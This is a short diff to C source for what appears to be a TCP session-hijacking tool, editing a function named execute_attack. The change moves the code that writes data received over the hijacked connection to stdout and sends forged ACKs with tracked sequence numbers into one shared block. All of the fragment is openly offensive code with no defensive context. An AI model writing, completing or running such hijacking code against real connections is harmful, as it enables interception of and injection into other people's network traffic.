@@ -327,23 +327,12 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 						/* see if we got data from remote... */
 						if ((flags & TH_PUSH) && (flags & TH_ACK)
 								&& rack == legit_conn.seq) {
-
 							//printf("[*] PSH|ACK received (len %lu)\n", datalen);
-							if (datalen > 0) {
-								write(fileno(stdout), data, datalen);
-								legit_conn.ack += datalen;
-								tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
-							}
 						}
 
 						/* they just ack'd what we sent only... */
 						else if (flags == TH_ACK && rack == legit_conn.seq) {
 							//printf("[*] ACK received (len %lu)\n", datalen);
-							if (datalen > 0) {
-								write(fileno(stdout), data, datalen);
-								legit_conn.ack += datalen;
-								tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
-							}
 						}
 
 						/* perhaps the remote said to shut down... */
@@ -367,6 +356,13 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 
 						else
 							printf("[*] Packet with unexpected flags (0x%x) received...\n", flags);
+
+						if (datalen > 0) {
+							write(fileno(stdout), data, datalen);
+							legit_conn.ack += datalen;
+							if (!tcp_send(pch, &legit_conn, TH_ACK, NULL, 0))
+								return 1;
+						}
 
 						break;
 
